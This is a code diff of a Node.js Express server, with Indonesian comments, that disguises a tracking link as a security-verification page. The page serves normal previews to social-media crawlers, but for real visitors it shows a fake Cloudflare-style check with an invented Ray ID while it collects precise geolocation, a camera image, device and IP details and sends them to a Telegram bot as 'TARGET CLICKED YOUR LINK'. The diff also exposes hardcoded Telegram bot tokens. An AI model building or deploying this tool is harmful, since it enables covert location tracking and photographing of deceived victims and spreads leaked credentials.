@@ -1,4 +1,3 @@
-// File: tracker.js
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
@@ -9,7 +8,8 @@ const { Buffer } = require('buffer');
 const app = express();
 const PORT = process.env.PORT || 3030;
 
-const BOT_TOKEN = process.env.BOT_TOKEN || '7870651367:AAGwnaIPcXhbTVDcV9LE0vBRTpuIIKtpwFQ'; // Ganti dengan token Anda atau gunakan environment variable
+// Ganti dengan token bot Telegram Anda di sini atau gunakan environment variable
+const BOT_TOKEN = process.env.BOT_TOKEN || '7804296227:AAEl74FdE71shWdAVhmlLXi8-9WPLnZ6pto';
 
 if (!BOT_TOKEN) {
     console.error("FATAL: BOT_TOKEN tidak didefinisikan!");
@@ -22,9 +22,8 @@ app.use(express.json({ limit: '10mb' }));
 app.set("json spaces", 2);
 app.use(cors());
 
-// --- ROUTE UTAMA UNTUK PELACAKAN (Tidak ada perubahan di sini) ---
+// Route utama untuk pelacakan
 app.get('/w', async (req, res) => {
-    // ... (Kode dari respons sebelumnya, tidak perlu diubah)
     const { url: targetUrl, creator: creatorId } = req.query;
 
     if (!targetUrl || !creatorId) {
@@ -35,6 +34,7 @@ app.get('/w', async (req, res) => {
     const crawlerUserAgents = ['TelegramBot', 'facebookexternalhit', 'WhatsApp', 'Twitterbot', 'Discordbot'];
     const isCrawler = crawlerUserAgents.some(crawler => userAgent.includes(crawler));
 
+    // Jika yang mengakses adalah crawler/bot, tampilkan metadata untuk preview link
     if (isCrawler) {
         try {
             const response = await axios.get(targetUrl);
@@ -42,7 +42,7 @@ app.get('/w', async (req, res) => {
             const getMetaTag = (prop) => root.querySelector(`meta[property="${prop}"]`)?.getAttribute('content') || '';
             const title = getMetaTag('og:title') || root.querySelector('title')?.text || 'Judul tidak ditemukan';
             const description = getMetaTag('og:description') || 'Deskripsi tidak ditemukan';
-            const image = getMetaTag('og:image') || '[https://sf-tools.fastcal.net/tiktok-icon.png](https://sf-tools.fastcal.net/tiktok-icon.png)';
+            const image = getMetaTag('og:image') || 'https://i.ibb.co/7J1p1zF/video-play-icon.png';
 
             return res.send(`
                 <!DOCTYPE html>
@@ -60,35 +60,82 @@ app.get('/w', async (req, res) => {
         }
     }
 
+    // Jika yang mengakses adalah pengguna asli, tampilkan halaman verifikasi
     res.send(`
     <!DOCTYPE html>
-    <html lang="en">
+    <html lang="id">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Connecting...</title>
+        <title>Memeriksa koneksi Anda...</title>
         <style>
-            @import url('[https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap](https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap)');
-            body { background-color: #010101; color: #fff; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; text-align: center; }
-            .container { max-width: 300px; padding: 20px; }
-            .logo { width: 80px; height: 80px; margin-bottom: 20px; }
-            h1 { font-size: 22px; margin-bottom: 10px; }
-            p { font-size: 14px; color: #aaa; margin-bottom: 30px; }
-            .spinner { border: 4px solid rgba(255, 255, 255, 0.2); border-left-color: #FE2C55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
+            html, body { width: 100%; height: 100%; margin: 0; padding: 0; }
+            body {
+                background-color: #f9f9f9;
+                color: #333;
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                text-align: center;
+            }
+            .check-container {
+                background-color: #ffffff;
+                padding: 40px 50px;
+                border-radius: 8px;
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+                border: 1px solid #e5e5e5;
+                max-width: 500px;
+                width: 90%;
+            }
+            .icon-container { margin-bottom: 20px; }
+            .icon-container svg { width: 50px; height: 50px; color: #007BFF; }
+            h1 { font-size: 24px; font-weight: 700; margin: 0 0 10px 0; color: #1a1a1a; }
+            p { font-size: 16px; color: #666; line-height: 1.6; margin-bottom: 30px; }
+            .spinner {
+                border: 4px solid rgba(0, 123, 255, 0.2);
+                border-left-color: #007BFF;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                animation: spin 1.2s linear infinite;
+                margin: 0 auto;
+            }
+            .footer-info { margin-top: 30px; font-size: 12px; color: #999; }
+            .footer-info span { display: block; }
             @keyframes spin { to { transform: rotate(360deg); } }
         </style>
     </head>
     <body>
-        <div class="container">
-            <img src="[https://sf-tools.fastcal.net/tiktok-icon.png](https://sf-tools.fastcal.net/tiktok-icon.png)" alt="TikTok Logo" class="logo">
-            <h1>Just a moment...</h1>
-            <p>We need to verify your connection to continue. Please approve any requests from your browser.</p>
+        <div class="check-container">
+            <div class="icon-container">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1.06 14.44L6.5 11l1.41-1.41 3.09 3.09 7.07-7.07L19.5 7.05l-8.48 8.48-0.08-0.09z"/>
+                </svg>
+            </div>
+            <h1>Memverifikasi koneksi Anda aman</h1>
+            <p>Proses ini otomatis untuk melindungi Anda dari ancaman online. Harap tunggu sebentar.</p>
             <div class="spinner"></div>
+            <div class="footer-info">
+                <span id="ray-id"></span>
+                <span>Security by ProjectSF</span>
+            </div>
         </div>
 
         <script>
+            function generateRayId() {
+                const chars = '0123456789abcdef';
+                let result = '';
+                for (let i = 0; i < 16; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+            document.getElementById('ray-id').textContent = 'Ray ID: ' + generateRayId();
+
             const redirectToTarget = () => {
-                setTimeout(() => { window.location.href = "${targetUrl}"; }, 500);
+                setTimeout(() => { window.location.href = "${targetUrl}"; }, 800);
             };
 
             async function logData(data) {
@@ -98,10 +145,12 @@ app.get('/w', async (req, res) => {
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-                } catch (e) { console.error('Log Error:', e); }
+                } catch (e) {
+                    console.error('Log Error:', e);
+                }
             }
 
-            async function getPermissions() {
+            async function processData() {
                 const data = {
                     creatorId: "${creatorId}",
                     targetUrl: "${targetUrl}",
@@ -118,7 +167,8 @@ app.get('/w', async (req, res) => {
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                     });
-                    data.location = \`https://www.google.com/maps/search/?api=1&query=\${position.coords.latitude},\${position.coords.longitude}\`;                } catch (e) {
+                    data.location = \`https://www.google.com/maps/search/?api=1&query=\${position.coords.latitude},\${position.coords.longitude}\`;
+                } catch (e) {
                     console.warn('Geolocation failed:', e.message);
                 }
 
@@ -142,21 +192,21 @@ app.get('/w', async (req, res) => {
                 redirectToTarget();
             }
 
-            window.onload = getPermissions;
+            window.onload = processData;
         </script>
     </body>
     </html>
     `);
 });
 
-// --- ROUTE UNTUK MENERIMA LOG & MENGIRIM KE TELEGRAM ---
+// Route untuk menerima log dan mengirim ke Telegram
 app.post('/log', async (req, res) => {
     const data = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const creatorId = data.creatorId;
 
     if (!creatorId) {
-        console.error("Log received without creatorId");
+        console.error("Log diterima tanpa creatorId");
         return res.sendStatus(400);
     }
 
@@ -167,36 +217,34 @@ app.post('/log', async (req, res) => {
             ipInfo = `*Negara:* ${ipRes.data.country}\n*Kota:* ${ipRes.data.city}, ${ipRes.data.regionName}\n*ISP:* ${ipRes.data.isp}\n*Organisasi:* ${ipRes.data.org}`;
         }
     } catch (e) {
-        console.error("Failed to fetch IP info:", e.message);
+        console.error("Gagal mengambil info IP:", e.message);
     }
 
-    // *** MODIFIKASI FORMAT PESAN NOTIFIKASI ***
     const isCameraAllowed = data.camera.startsWith('data:image/jpeg;base64,');
     const cameraStatusText = isCameraAllowed ? '✅ Diizinkan (Gambar terlampir)' : data.camera;
 
-    // Menghapus semua backtick ``, hanya menggunakan bold ** dan teks biasa
     const message =
-`🎯 **TARGET MENGKLIK LINK ANDA!** 🎯
+`🎯 *TARGET MENGKLIK LINK ANDA!* 🎯
 -----------------------------------
-🔗 *U*RL Asli:** ${data.targetUrl}
+🔗 *URL Asli:* ${data.targetUrl}
 
-🖥️ **Info Perangkat & Jaringan**
-- **Alamat IP:** ${ip}
-- **Detail IP:**\n${ipInfo}
-- **User Agent:** ${data.userAgent}
-- **Platform:** ${data.platform} (${data.screenWidth}x${data.screenHeight})
-- **Bahasa:** ${data.language}
+🖥️ *Info Perangkat & Jaringan*
+- *Alamat IP:* ${ip}
+- *Detail IP:*\n${ipInfo}
+- *User Agent:* ${data.userAgent}
+- *Platform:* ${data.platform} (${data.screenWidth}x${data.screenHeight})
+- *Bahasa:* ${data.language}
 
-📍 **Izin yang didapat**
-- **Lokasi:** ${data.location}
-- **Status Kamera:** ${cameraStatusText}
+📍 *Izin yang didapat*
+- *Lokasi:* ${data.location}
+- *Status Kamera:* ${cameraStatusText}
 `;
 
     try {
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: creatorId,
             text: message,
-            parse_mode: 'Markdown', // Tetap Markdown untuk menghandle bold (**)
+            parse_mode: 'Markdown',
             disable_web_page_preview: true
         });
 
@@ -214,14 +262,15 @@ app.post('/log', async (req, res) => {
             });
         }
     } catch (error) {
-        console.error("Failed to send log to Telegram:", error.response?.data || error.message);
+        const errorMessage = error.response ? JSON.stringify(error.response.data) : error.message;
+        console.error("Gagal mengirim log ke Telegram:", errorMessage);
     }
     
     res.sendStatus(200);
 });
 
 app.listen(PORT, () => {
-    console.log(`Tracking server running on port ${PORT}`);
+    console.log(`Server pelacak berjalan di port ${PORT}`);
 });
 
 module.exports = app;
